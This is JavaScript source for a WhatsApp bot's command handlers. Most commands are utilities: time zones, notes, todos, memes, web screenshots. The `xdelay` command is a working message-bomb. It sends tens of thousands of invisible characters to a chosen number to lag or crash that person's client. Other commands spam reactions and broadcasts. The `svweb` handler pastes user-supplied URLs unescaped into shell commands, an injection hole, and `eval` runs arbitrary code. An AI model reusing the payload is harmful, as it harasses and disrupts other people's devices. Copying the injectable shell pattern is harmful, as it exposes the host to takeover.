/* ── TIME / MISC ── */
builtInCommands.time = { desc: '🕐 Time', execute: async (sock, sender, args, msg) => {
  const c = args.join(' ') || 'Africa/Harare';
  if (moment?.tz) { try { const tz = moment.tz.zone(c.replace(/ /g, '_')) ? c.replace(/ /g, '_') : c; const n = moment().tz(tz); return style.reply(sock, sender, style.box('TIME', `${c}\n${n.format('YYYY-MM-DD HH:mm:ss')}\n${n.format('dddd')}`), msg); } catch(e) {} }
  try { const now = new Date(); const s = now.toLocaleString('en-US', { timeZone: c }); await style.reply(sock, sender, style.box('TIME', `${c}\n${s}`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Invalid timezone.'), msg); }
}};

builtInCommands.countdown = { desc: '📆 Countdown', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .countdown YYYY-MM-DD'), msg);
  const t = new Date(args[0]); if (isNaN(t)) return style.reply(sock, sender, style.error('Invalid date.'), msg);
  const d = Math.ceil((t - new Date()) / 86400000);
  await style.reply(sock, sender, style.box('COUNTDOWN', `${args[0]}\n${d > 0 ? d + ' days left' : Math.abs(d) + ' days ago'}`), msg);
}};

builtInCommands.age = { desc: '🎂 Age', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .age YYYY-MM-DD'), msg);
  const b = new Date(args[0]); if (isNaN(b)) return style.reply(sock, sender, style.error('Invalid.'), msg);
  const diff = Date.now() - b.getTime();
  await style.reply(sock, sender, style.box('AGE', `${Math.floor(diff / 31557600000)} years\n${Math.floor(diff / 86400000)} days`), msg);
}};

builtInCommands.bmi = { desc: '⚖️ BMI', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .bmi <kg> <cm>'), msg);
  const w = parseFloat(args[0]), h = parseFloat(args[1]) / 100;
  const b = (w / (h * h)).toFixed(1);
  let c = 'Normal'; if (b < 18.5) c = 'Underweight'; else if (b >= 25 && b < 30) c = 'Overweight'; else if (b >= 30) c = 'Obese';
  await style.reply(sock, sender, style.box('BMI', `${b} — ${c}`), msg);
}};

builtInCommands.unit = { desc: '📏 Unit', execute: async (sock, sender, args, msg) => {
  if (args.length < 3) return style.reply(sock, sender, style.error('Usage: .unit <val> <from> <to>'), msg);
  if (convert) { try { const v = convert(parseFloat(args[0])).from(args[1]).to(args[2]); return style.reply(sock, sender, style.box('UNIT', `${args[0]} ${args[1]} = ${v.toFixed(4)} ${args[2]}`), msg); } catch(e) { return style.reply(sock, sender, style.error('Invalid conversion.'), msg); } }
  await style.reply(sock, sender, style.error('Install convert-units.'), msg);
}};

builtInCommands.base64 = { desc: '🔡 Base64', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .base64 <text>'), msg); await style.reply(sock, sender, style.box('BASE64', Buffer.from(args.join(' ')).toString('base64')), msg); } };
builtInCommands.unbase64 = { desc: '🔡 Unbase64', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .unbase64 <b64>'), msg); try { await style.reply(sock, sender, style.box('DECODED', Buffer.from(args[0], 'base64').toString('utf8')), msg); } catch(e) { await style.reply(sock, sender, style.error('Invalid.'), msg); } } };
builtInCommands.hash = { desc: '🔐 Hash', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .hash <text>'), msg); const t = args.join(' '); await style.reply(sock, sender, style.box('HASH', `MD5: ${crypto.createHash('md5').update(t).digest('hex')}\n\nSHA256: ${crypto.createHash('sha256').update(t).digest('hex')}`), msg); } };
builtInCommands.uuid = { desc: '🆔 UUID', execute: async (sock, sender, args, msg) => { await style.reply(sock, sender, style.box('UUID', crypto.randomUUID()), msg); } };
builtInCommands.random = { desc: '🎲 Random', execute: async (sock, sender, args, msg) => { const mn = parseInt(args[0]) || 1, mx = parseInt(args[1]) || 100; await style.reply(sock, sender, style.box('RANDOM', `${mn}–${mx} → *${Math.floor(Math.random() * (mx - mn + 1)) + mn}*`), msg); } };
builtInCommands.pick = { desc: '🎯 Pick', execute: async (sock, sender, args, msg) => { const items = args.join(' ').split('|').map(s => s.trim()).filter(Boolean); if (items.length < 2) return style.reply(sock, sender, style.error('Usage: .pick a | b | c'), msg); await style.reply(sock, sender, style.box('PICK', items[Math.floor(Math.random() * items.length)]), msg); } };
builtInCommands.binary = { desc: '🔢 Binary', execute: async (sock, sender, args, msg) => { if (!args.length) return style.reply(sock, sender, style.error('Usage: .binary <text>'), msg); await style.reply(sock, sender, style.box('BINARY', args.join(' ').split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' ')), msg); } };

/* ── NOTES / TODOS ── */
builtInCommands.note = builtInCommands.addnote = { desc: '📝 Save note', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .note <text>'), msg);
  const rt = getRuntime(sock);
  const k = msg.key.participant || sender;
  if (!rt.userNotes.has(k)) rt.userNotes.set(k, []);
  rt.userNotes.get(k).push({ text: args.join(' '), at: Date.now() }); saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Saved (${rt.userNotes.get(k).length}).`), msg);
}};

builtInCommands.notes = { desc: '📝 Notes', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  const l = rt.userNotes.get(msg.key.participant || sender) || [];
  if (!l.length) return style.reply(sock, sender, style.error('None.'), msg);
  await style.reply(sock, sender, style.box('NOTES', l.map((n, i) => `${i + 1}. ${n.text}`).join('\n')), msg);
}};

builtInCommands.delnote = { desc: '🗑️ Delete note', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  const i = parseInt(args[0]) - 1;
  const l = rt.userNotes.get(msg.key.participant || sender) || [];
  if (i < 0 || i >= l.length) return style.reply(sock, sender, style.error('Invalid.'), msg);
  l.splice(i, 1); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Deleted.'), msg);
}};

builtInCommands.clearnotes = { desc: '🗑️ Clear notes', execute: async (sock, sender, args, msg) => { const rt = getRuntime(sock); rt.userNotes.set(msg.key.participant || sender, []); saveRuntime(sock); await style.reply(sock, sender, style.success('Cleared.'), msg); } };

builtInCommands.todo = builtInCommands.addtodo = { desc: '✅ Add todo', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .todo <task>'), msg);
  const rt = getRuntime(sock);
  const k = msg.key.participant || sender;
  if (!rt.userTodos.has(k)) rt.userTodos.set(k, []);
  rt.userTodos.get(k).push({ task: args.join(' '), done: false }); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Added.'), msg);
}};

builtInCommands.todos = { desc: '✅ Todos', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  const l = rt.userTodos.get(msg.key.participant || sender) || [];
  if (!l.length) return style.reply(sock, sender, style.error('None.'), msg);
  await style.reply(sock, sender, style.box('TODOS', l.map((t, i) => `${i + 1}. [${t.done ? '✓' : ' '}] ${t.task}`).join('\n')), msg);
}};

builtInCommands.donetodo = { desc: '✅ Done', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  const i = parseInt(args[0]) - 1;
  const l = rt.userTodos.get(msg.key.participant || sender) || [];
  if (i < 0 || i >= l.length) return style.reply(sock, sender, style.error('Invalid.'), msg);
  l[i].done = true; saveRuntime(sock);
  await style.reply(sock, sender, style.success('Done.'), msg);
}};

builtInCommands.deltodo = { desc: '🗑️ Delete todo', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  const i = parseInt(args[0]) - 1;
  const l = rt.userTodos.get(msg.key.participant || sender) || [];
  if (i < 0 || i >= l.length) return style.reply(sock, sender, style.error('Invalid.'), msg);
  l.splice(i, 1); saveRuntime(sock);
  await style.reply(sock, sender, style.success('Deleted.'), msg);
}};

builtInCommands.cleartodos = { desc: '🗑️ Clear todos', execute: async (sock, sender, args, msg) => { const rt = getRuntime(sock); rt.userTodos.set(msg.key.participant || sender, []); saveRuntime(sock); await style.reply(sock, sender, style.success('Cleared.'), msg); } };

/* ── OWNER OPS ── */
builtInCommands.broadcast = { desc: '📢 Broadcast', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .broadcast <msg>'), msg);
  await style.react(sock, sender, msg, '📢');
  const g = await sock.groupFetchAllParticipating();
  const ids = Object.keys(g);
  let n = 0; for (const id of ids) { try { await sock.sendMessage(id, { text: `📢 *BROADCAST*\n\n${args.join(' ')}`, contextInfo: CHANNEL_CONTEXT }); n++; await delay(500); } catch(e) {} }
  await style.reply(sock, sender, style.success(`Sent to ${n}/${ids.length}.`), msg);
}};

builtInCommands.setprefix = { desc: '🔧 Set prefix', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .setprefix <char>'), msg);
  const rt = getRuntime(sock);
  rt.customPrefix = args[0]; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Prefix changed to: ${args[0]}`), msg);
}};

builtInCommands.mode = { desc: '🔐 Set mode', execute: async (sock, sender, args, msg) => {
  if (!['public', 'private'].includes(args[0])) return style.reply(sock, sender, style.error('Usage: .mode public|private'), msg);
  const rt = getRuntime(sock);
  rt.BOT_MODE = args[0]; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Mode: ${rt.BOT_MODE}`), msg);
}};

builtInCommands.owneronly = { desc: '🔐 Toggle owner-only', execute: async (sock, sender, args, msg) => {
  const rt = getRuntime(sock);
  rt.OWNER_ONLY = !rt.OWNER_ONLY; saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Owner-only: ${rt.OWNER_ONLY ? 'ON' : 'OFF'}`), msg);
}};

builtInCommands.addsudo = { desc: '➕ Add sudo', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .addsudo <number>'), msg);
  const rt = getRuntime(sock);
  rt.SUDO.add(args[0].replace(/[^0-9]/g, '')); saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Added +${args[0]}.`), msg);
}};

builtInCommands.delsudo = { desc: '➖ Remove sudo', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .delsudo <number>'), msg);
  const rt = getRuntime(sock);
  rt.SUDO.delete(args[0].replace(/[^0-9]/g, '')); saveRuntime(sock);
  await style.reply(sock, sender, style.success(`Removed +${args[0]}.`), msg);
}};

builtInCommands.sudos = { desc: '📋 Sudo list', execute: async (sock, sender, args, msg) => { const rt = getRuntime(sock); await style.reply(sock, sender, style.box('SUDO', rt.SUDO.size ? [...rt.SUDO].map(n => '+' + n).join('\n') : 'None'), msg); } };
builtInCommands.reload = { desc: '🔄 Reload plugins', execute: async (sock, sender, args, msg) => { for (const k of Object.keys(plugins)) delete plugins[k]; loadPlugins(); await style.reply(sock, sender, style.success(`Reloaded ${Object.keys(plugins).length} plugins.`), msg); } };

builtInCommands.backup = { desc: '💾 Backup', execute: async (sock, sender, args, msg) => {
  if (!archiver) return style.reply(sock, sender, style.error('Install archiver.'), msg);
  await style.react(sock, sender, msg, '💾');
  const zp = path.join(TMP_DIR, `backup-${Date.now()}.zip`);
  await new Promise((res, rej) => { const o = fs.createWriteStream(zp); const a = archiver('zip', { zlib: { level: 9 } }); o.on('close', res); a.on('error', rej); a.pipe(o); a.finalize(); });
  if (OWNER_NUMBER) await sock.sendMessage(OWNER_NUMBER + '@s.whatsapp.net', { document: fs.readFileSync(zp), mimetype: 'application/zip', fileName: 'vante-backup.zip', caption: '💾 Backup (owner DM)' });
  await style.reply(sock, sender, style.success('Backup created.'), msg);
  try { fs.unlinkSync(zp); } catch(e) {}
}};

builtInCommands.eval = { desc: '🧪 Eval', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .eval <code>'), msg);
  await style.react(sock, sender, msg, '🧪');
  try { let r = await eval(`(async()=>{${args.join(' ')}})()`); if (typeof r !== 'string') r = JSON.stringify(r, null, 2); await style.reply(sock, sender, style.box('EVAL', fonts.mono(String(r).substring(0, 3000))), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Eval: ' + e.message), msg); }
}};

/* ── CHANNEL ── */
builtInCommands.setchannel = { desc: '📢 Set channel', execute: async (sock, sender, args, msg) => { const rt = getRuntime(sock); rt.settings.targetChannel = args[0] || sender; saveRuntime(sock); await style.reply(sock, sender, style.success(`Channel: ${rt.settings.targetChannel}`), msg); } };
builtInCommands.resetchannel = { desc: '🔄 Reset channel', execute: async (sock, sender, args, msg) => { const rt = getRuntime(sock); delete rt.settings.targetChannel; saveRuntime(sock); await style.reply(sock, sender, style.success('Reset.'), msg); } };

builtInCommands['1000reactions'] = { desc: '⚡ Batch reactions', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo;
  if (!q?.stanzaId) return style.reply(sock, sender, style.error('Reply to a message.'), msg);
  await style.react(sock, sender, msg, '⚡');
  const count = Math.min(parseInt(args[0]) || 20, 50);
  const key = { remoteJid: sender, id: q.stanzaId, fromMe: false, participant: q.participant || undefined };
  const em = ['🔥', '💀', '😂', '❤️', '👑', '⚡', '🎯', '💯', '🚀', '👽'];
  let n = 0; for (let i = 0; i < count; i++) { try { await sock.sendMessage(sender, { react: { text: em[i % em.length], key } }); n++; await delay(180); } catch(e) { break; } }
  await style.reply(sock, sender, style.success(`Sent ${n}/${count}.`), msg);
}};


/* ── EXTRA ── */
builtInCommands.cat = { desc: '🐱 Random cat', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🐱'); try { const r = await axios.get('https://api.thecatapi.com/v1/images/search', { timeout: 10000 }); await sock.sendMessage(sender, { image: { url: r.data[0].url }, caption: style.success('Meow 𓆣'), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };
builtInCommands.dog = { desc: '🐶 Random dog', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🐶'); try { const r = await axios.get('https://dog.ceo/api/breeds/image/random', { timeout: 10000 }); await sock.sendMessage(sender, { image: { url: r.data.message }, caption: style.success('Woof 𓆣'), contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };
builtInCommands.meme = { desc: '😂 Random meme', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '😂');
  try {
    const res = await APIs.getMeme();
    if (res?.url) { await sock.sendMessage(sender, { image: { url: res.url }, caption: `😂 *${res.title || 'Meme'}*\n👍 ${res.ups || 0}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); return; }
  } catch(e) {}
  try { const r = await axios.get('https://meme-api.com/gimme', { timeout: 10000 }); await sock.sendMessage(sender, { image: { url: r.data.url }, caption: `😂 *${r.data.title}*\n👍 ${r.data.ups} | r/${r.data.subreddit}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e2) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};
builtInCommands.advice = { desc: '💡 Advice', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '💡'); try { const r = await axios.get('https://api.adviceslip.com/advice', { timeout: 10000 }); await style.reply(sock, sender, style.box('ADVICE', r.data.slip.advice), msg); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };
builtInCommands.dadjoke = { desc: '👨 Dad joke', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '👨'); try { const r = await axios.get('https://icanhazdadjoke.com/', { headers: { Accept: 'application/json' }, timeout: 10000 }); await style.reply(sock, sender, style.box('👨 DAD JOKE', r.data.joke), msg); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };

builtInCommands.ssweb = builtInCommands.screenshot = { desc: '📸 Web screenshot', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .ssweb <url>'), msg);
  await style.react(sock, sender, msg, '📸');
  const url = args[0].startsWith('http') ? args[0] : 'https://' + args[0];
  try {
    const buf = await APIs.screenshotWebsite(url);
    await sock.sendMessage(sender, { image: buf, caption: `📸 ${url}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
  } catch(e) {
    try { const r = await axios.get(`https://image.thum.io/get/width/1200/crop/900/${url}`, { responseType: 'arraybuffer', timeout: 30000 }); await sock.sendMessage(sender, { image: Buffer.from(r.data), caption: `📸 ${url}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
    catch(e2) { await style.reply(sock, sender, style.error('Failed.'), msg); }
  }
}};

builtInCommands.emojimix = { desc: '🧩 Mix emojis', execute: async (sock, sender, args, msg) => {
  if (args.length < 2) return style.reply(sock, sender, style.error('Usage: .emojimix 😀 😎'), msg);
  await style.react(sock, sender, msg, '🧩');
  try { const r = await axios.get(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(args[0] + '_' + args[1])}`, { timeout: 12000 }); const url = r.data.results?.[0]?.url; if (!url) return style.reply(sock, sender, style.error('No mix.'), msg); await sock.sendMessage(sender, { image: { url }, caption: `🧩 ${args[0]}+${args[1]}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.waifu = { desc: '🌸 Random waifu', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🌸'); try { const r = await axios.get('https://api.waifu.pics/sfw/waifu', { timeout: 10000 }); await sock.sendMessage(sender, { image: { url: r.data.url }, caption: '🌸 Waifu 𓆣', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };
builtInCommands.neko = { desc: '🐱 Neko', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🐱'); try { const r = await axios.get('https://api.waifu.pics/sfw/neko', { timeout: 10000 }); await sock.sendMessage(sender, { image: { url: r.data.url }, caption: '🐱 Neko 𓆣', contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };

builtInCommands.paste = { desc: '📋 Pastebin', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .paste <text>'), msg);
  await style.react(sock, sender, msg, '📋');
  try { const r = await axios.post('https://paste.rs/', args.join(' '), { headers: { 'Content-Type': 'text/plain' }, timeout: 15000 }); await style.reply(sock, sender, style.box('PASTE', r.data.trim()), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.attp = { desc: '✨ Text sticker', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .attp <text>'), msg);
  await style.react(sock, sender, msg, '✨');
  try { const r = await axios.get(`https://image.pollinations.ai/prompt/${encodeURIComponent('sticker text "' + args.join(' ') + '"')}?width=512&height=512&nologo=true`, { responseType: 'arraybuffer', timeout: 30000 }); const st = new Sticker(Buffer.from(r.data), { pack: BOT_NAME, author: OWNER_NAME, type: StickerTypes.FULL, quality: 70 }); await sock.sendMessage(sender, { sticker: await st.toBuffer() }, { quoted: msg }); }
  catch(e2) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.randomfact = { desc: '🎓 Random fact', execute: async (sock, sender, args, msg) => { await style.react(sock, sender, msg, '🎓'); try { const r = await axios.get('https://uselessfacts.jsph.pl/api/v2/facts/random', { timeout: 10000 }); await style.reply(sock, sender, style.box('🎓 FACT', r.data.text), msg); } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); } } };

builtInCommands.xdelay = { desc: '🧨 xdelay heavy payload', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🧨');
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  let target = ctx?.mentionedJid?.[0] || ctx?.participant || (args[0] ? (args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net') : null) || sender;
  if (!target) return style.reply(sock, sender, style.error('Usage: .xdelay <number> | @mention | reply'), msg);
  try {
    const payload = '\u2063'.repeat(50000);
    const chunks = payload.match(/.{1,60000}/g) || [];
    for (let i = 0; i < Math.min(chunks.length, 3); i++) {
      await sock.sendMessage(target, { text: chunks[i] });
      await delay(300);
    }
    await style.reply(sock, sender, style.success(`xdelay sent to ${target.split('@')[0]}`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('xdelay failed: ' + e.message), msg); }
}};

builtInCommands.report = { desc: '📝 Report', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '📝');
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .report <issue>'), msg);
  const rep = (msg.key.participant || msg.key.remoteJid || sender).split('@')[0].split(':')[0];
  try { if (OWNER_NUMBER) await sock.sendMessage(OWNER_NUMBER + '@s.whatsapp.net', { text: `📝 REPORT\n\nFrom: +${rep}\nIssue: ${args.join(' ')}` }); await style.reply(sock, sender, style.success(`Report sent.`), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.botcage = { desc: '🔒 BotCage', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🔒');
  const jid = msg.key.remoteJid;
  if (args[0] === 'list') { if (!cagedGroups.size) return style.reply(sock, sender, style.box('BOTCAGE', 'None.'), msg); return style.reply(sock, sender, style.box(`BOTCAGED (${cagedGroups.size})`, [...cagedGroups.keys()].map((g, i) => `#${i + 1} ${g}`).join('\n')), msg); }
  if (!jid.endsWith('@g.us')) return style.reply(sock, sender, style.error('Group only.'), msg);
  if (!cagedGroups.has(jid)) { try { cagedGroups.set(jid, await sock.groupInviteCode(jid)); await style.reply(sock, sender, style.success('🔒 BotCage ON.'), msg); } catch(e) { await style.reply(sock, sender, style.error('Need admin.'), msg); } }
  else { cagedGroups.delete(jid); await style.reply(sock, sender, style.success('🔓 BotCage OFF.'), msg); }
}};

builtInCommands.del = { desc: '🗑️ Delete message', execute: async (sock, sender, args, msg) => {
  await style.react(sock, sender, msg, '🗑️');
  try {
    const ctx = msg.message?.extendedTextMessage?.contextInfo;
    if (ctx?.stanzaId && ctx?.participant) {
      await sock.sendMessage(sender, { delete: { remoteJid: sender, fromMe: false, id: ctx.stanzaId, participant: ctx.participant } });
    } else {
      await sock.sendMessage(sender, { delete: msg.key });
    }
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};

builtInCommands.svweb = builtInCommands.vidweb = { desc: '🎥 Record website video (30s)', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .svweb <url>'), msg);
  await style.react(sock, sender, msg, '🎥');
  await style.reply(sock, sender, style.wait('Recording 30s of website... This takes ~35s.'), msg);
  const url = args[0].startsWith('http') ? args[0] : 'https://' + args[0];
  const out = path.join(TMP_DIR, `webvid_${Date.now()}.mp4`);
  try {
    const hasChrome = await execAsync('which chromium-browser || which chromium || which google-chrome || which google-chrome-stable', { timeout: 5000 }).then(() => true).catch(() => false);
    if (!hasChrome) return style.reply(sock, sender, style.error('Chrome/Chromium not installed.'), msg);
    const hasFfmpeg = await execAsync('which ffmpeg', { timeout: 5000 }).then(() => true).catch(() => false);
    if (!hasFfmpeg) return style.reply(sock, sender, style.error('FFmpeg not installed.'), msg);
    const frames = [];
    for (let i = 0; i < 30; i++) {
      const frame = path.join(TMP_DIR, `frame_${Date.now()}_${i}.jpg`);
      await execAsync(`timeout 5 chromium-browser --headless --no-sandbox --disable-gpu --window-size=1280,720 --screenshot="${frame}" "${url}" 2>/dev/null || timeout 5 google-chrome --headless --no-sandbox --disable-gpu --window-size=1280,720 --screenshot="${frame}" "${url}" 2>/dev/null`, { timeout: 8000 }).catch(() => {});
      if (fs.existsSync(frame)) frames.push(frame);
      await delay(200);
      if (frames.length >= 10) break;
    }
    if (!frames.length) return style.reply(sock, sender, style.error('Failed to capture frames.'), msg);
    const listFile = path.join(TMP_DIR, `frames_${Date.now()}.txt`);
    fs.writeFileSync(listFile, frames.map(f => `file '${f}'`).join('\n'));
    await execAsync(`ffmpeg -y -f concat -safe 0 -i "${listFile}" -c:v libx264 -pix_fmt yuv420p -vf "setpts=2*PTS" -r 5 "${out}"`, { timeout: 60000 });
    if (fs.existsSync(out)) {
      await sock.sendMessage(sender, { video: fs.readFileSync(out), caption: `🎥 ${url}`, mimetype: 'video/mp4', contextInfo: CHANNEL_CONTEXT }, { quoted: msg });
      await style.react(sock, sender, msg, '✅');
    } else await style.reply(sock, sender, style.error('Video creation failed.'), msg);
    frames.forEach(f => { try { fs.unlinkSync(f); } catch(e) {} });
    try { fs.unlinkSync(listFile); } catch(e) {}
    try { fs.unlinkSync(out); } catch(e) {}
  } catch(e) { await style.reply(sock, sender, style.error('Failed: ' + e.message), msg); }
}};

builtInCommands.webmp4 = { desc: '🌐 Website to MP4', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .webmp4 <url>'), msg);
  return builtInCommands.svweb.execute(sock, sender, args, msg);
}};

builtInCommands.song2 = { desc: '🎵 Alt YouTube audio', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .song2 <query>'), msg);
  return playExecute(sock, sender, args, msg);
}};

builtInCommands.video2 = { desc: '🎥 Alt YouTube video', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .video2 <query>'), msg);
  return builtInCommands.video.execute(sock, sender, args, msg);
}};

builtInCommands.shazam = { desc: '🎵 Identify song (from audio)', execute: async (sock, sender, args, msg) => {
  const q = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  if (!msg.message?.audioMessage && !q?.audioMessage) return style.reply(sock, sender, style.error('Reply to audio.'), msg);
  await style.react(sock, sender, msg, '🎵');
  await style.reply(sock, sender, style.wait('Identifying...'), msg);
  try {
    const buf = await downloadMsg(sock, msg);
    if (!buf) return style.reply(sock, sender, style.error('Could not download.'), msg);
    const form = new FormData();
    form.append('file', buf, { filename: 'audio.mp3', contentType: 'audio/mpeg' });
    const r = await axios.post('https://api.audd.io/', form, { timeout: 30000 }).catch(() => null);
    if (r?.data?.result) {
      const s = r.data.result;
      await style.reply(sock, sender, style.box('🎵 SHAZAM', `${style.kv('Title', s.title)}\n${style.kv('Artist', s.artist)}\n${style.kv('Album', s.album || '?')}`), msg);
    } else await style.reply(sock, sender, style.error('Could not identify.'), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.gimage = builtInCommands.gimg = { desc: '🖼️ Google Images', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .gimg <query>'), msg);
  await style.react(sock, sender, msg, '🖼️');
  try { await sock.sendMessage(sender, { image: { url: `https://image.pollinations.ai/prompt/${encodeURIComponent(args.join(' '))}?width=1024&height=1024&nologo=true` }, caption: `🖼️ ${args.join(' ')}`, contextInfo: CHANNEL_CONTEXT }, { quoted: msg }); }
  catch(e) { await style.reply(sock, sender, style.error('Failed.'), msg); }
}};

builtInCommands.ytsearch = { desc: '🔍 YT search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .ytsearch <query>'), msg);
  return builtInCommands.yts.execute(sock, sender, args, msg);
}};

builtInCommands.ttsearch = { desc: '🔍 TikTok search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .ttsearch <query>'), msg);
  await style.react(sock, sender, msg, '🔍');
  try { const r = await axios.get(`https://www.tiktok.com/api/search/general/full/?keyword=${encodeURIComponent(args.join(' '))}&count=5`, { headers: { 'User-Agent': 'Mozilla/5.0' }, timeout: 12000 }); const items = r.data?.data || []; let out = ''; items.slice(0, 5).forEach((it, i) => { out += `${i + 1}. ${it.item?.desc || 'Video'}\n🔗 https://tiktok.com/@${it.item?.author?.uniqueId}/video/${it.item?.id}\n\n`; }); await style.reply(sock, sender, style.box('TIKTOK', out || 'None.'), msg); }
  catch(e) { await style.reply(sock, sender, style.error('Search failed.'), msg); }
}};

builtInCommands.pinterestsearch = builtInCommands.pinsearch = { desc: '📌 Pinterest search', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .pinsearch <query>'), msg);
  return builtInCommands.pinterest.execute(sock, sender, args, msg);
}};

builtInCommands.fbsearch = { desc: '🔍 Facebook video search', execute: async (sock, sender, args, msg) => {
  if (!args[0]) return style.reply(sock, sender, style.error('Usage: .fbsearch <url>'), msg);
  return builtInCommands.facebook.execute(sock, sender, args, msg);
}};

builtInCommands.calc2 = { desc: '🧮 Advanced calc', execute: async (sock, sender, args, msg) => {
  if (!args.length) return style.reply(sock, sender, style.error('Usage: .calc2 <expr>'), msg);
  await style.react(sock, sender, msg, '🧮');
  try {
    const e = args.join('').replace(/[^0-9+\-*/().%\s^]/g, '').replace(/\^/g, '**');
    const r = Function('"use strict";return(' + e + ')')();
    await style.reply(sock, sender, style.box('CALC', `${e} = *${r}*`), msg);
  } catch(e) { await style.reply(sock, sender, style.error('Bad expr.'), msg); }
}};

builtInCommands.percentage = { desc: '📊 Percentage calc', execute: async (sock, sender, args, msg) => {
  if (args.length < 3) return style.reply(sock, sender, style.error('Usage: .percentage <what> <of> <total>'), msg);
  await style.react(sock, sender, msg, '📊');
  const p = (parseFloat(args[0]) / parseFloat(args[2])) * 100;
  await style.reply(sock, sender, style.box('PERCENTAGE', `${args[0]} is ${p.toFixed(2)}% of ${args[2]}`), msg);
}};

